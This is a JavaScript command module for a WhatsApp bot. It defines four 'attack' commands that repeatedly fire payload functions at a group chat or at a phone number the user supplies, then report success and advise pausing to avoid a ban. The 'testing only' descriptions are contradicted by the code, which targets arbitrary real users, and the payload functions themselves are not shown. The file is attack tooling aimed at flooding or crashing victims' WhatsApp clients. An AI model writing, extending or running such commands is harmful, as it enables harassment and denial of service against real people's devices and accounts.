const { cmd } = require("../command");

//terminate-group
cmd({
  pattern: "terminate-group",
  alias: ["gcattack"],
  desc: "Simulate attack on group (testing only)",
  category: "attack",
  react: "🆘",
  filename: __filename
}, async (conn, mek, m, { reply }) => {
  try {
    if (!m?.isGroup) return reply("❌ This command only works in groups.");

    await conn.sendMessage(m.chat, { react: { text: '🆘', key: m.key } });

    for (let r = 0; r < 15; r++) {
      await jemoogc(m.chat);
      await jemoogc(m.chat);
      await jemoogc(m.chat);
      await jemoogc(m.chat);
    }

    await sleep(1000);
    reply(`[ 🔥 ] Group is under attack now
 _*Status*_ : *SUCCESS  ATTACK ✅*
 _*Type*_ : _terminate-group_
> pause for five-ten minutes to avoid ban`);
  } catch (e) {
    console.error(e);
    reply("❌ Error occurred.");
  }
});

//terminate-beta
cmd({
  pattern: "terminate-beta",
  alias: ["betaattack"],
  desc: "Simulate beta attack (testing only)",
  category: "attack",
  react: "🧪",
  filename: __filename
}, async (conn, mek, m, { q, reply }) => {
  try {
    if (!q) return reply(`*Format Invalid!*\nUse: .terminate-beta 923xxx`);

    let client = m.mentionedJid[0] ? m.mentionedJid[0] :
                 m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '');
    let isTarget = client + "@s.whatsapp.net";

    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });

    let process = `*Information Attack*
* Sender : ${m.pushName}
* Target : ${client}
* Status : Process.....`;
    await reply(process);

    for (let r = 0; r < 50; r++) {
      await jemoobeta(isTarget);
      await sleep(5000);
      await jemoobeta(isTarget);
      await jemoobeta(isTarget);
      await sleep(5000);
      await jemoobeta(isTarget);
    }

    let success = `*Information Attack*
* Sender : ${m.pushName}
* Target : ${client}
* Status : Success`;
    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    reply(success);
  } catch (e) {
    console.error(e);
    reply("❌ Error occurred.");
  }
});

//terminate-ios
cmd({
  pattern: "terminate-ios",
  alias: ["iosattack"],
  desc: "Simulate iOS attack (testing only)",
  category: "attack",
  react: "📱",
  filename: __filename
}, async (conn, mek, m, { q, reply }) => {
  try {
    if (!q) return reply(`*Format Invalid!*\nUse: .terminate-ios 923xxx`);

    let client = m.mentionedJid[0] ? m.mentionedJid[0] :
                 m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '');
    let isTarget = client + "@s.whatsapp.net";

    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });

    let process = `*Information Attack*
* Sender : ${m.pushName}
* Target : ${client}
* Status : Process.....`;
    await reply(process);

    for (let r = 0; r < 50; r++) {
      await IOS(isTarget);
      await sleep(5000);
      await IOS(isTarget);
      await IOS(isTarget);
      await sleep(5000);
      await IOS(isTarget);
    }

    let success = `*Information Attack*
* Sender : ${m.pushName}
* Target : ${client}
* Status : Success`;
    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    reply(success);
  } catch (e) {
    console.error(e);
    reply("❌ Error occurred.");
  }
});

//terminate-new
cmd({
  pattern: "terminate-new",
  alias: ["newattack"],
  desc: "Simulate attack on a number (testing only)",
  category: "attack",
  react: "🚨",
  filename: __filename
}, async (conn, mek, m, { q, reply }) => {
  try {
    if (!q) return reply(`*Format Invalid!*\nUse: .terminate-new 923xxx`);

    let client = m.mentionedJid[0] ? m.mentionedJid[0] :
                 m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '');
    let isTarget = client + "@s.whatsapp.net";

    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });

    let process = `*Information Attack*
* Sender : ${m.pushName}
* Target : ${client}
* Status : Process.....`;
    await reply(process);

    for (let r = 0; r < 50; r++) {
      await jemodex(isTarget);
      await sleep(5000);
      await jemodex(isTarget);
      await jemodex(isTarget);
      await sleep(5000);
      await jemodex(isTarget);
    }

    let success = `*Information Attack*
* Sender : ${m.pushName}
* Target : ${client}
* Status : Success`;
    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    reply(success);
  } catch (e) {
    console.error(e);
    reply("❌ Error occurred.");
  }
});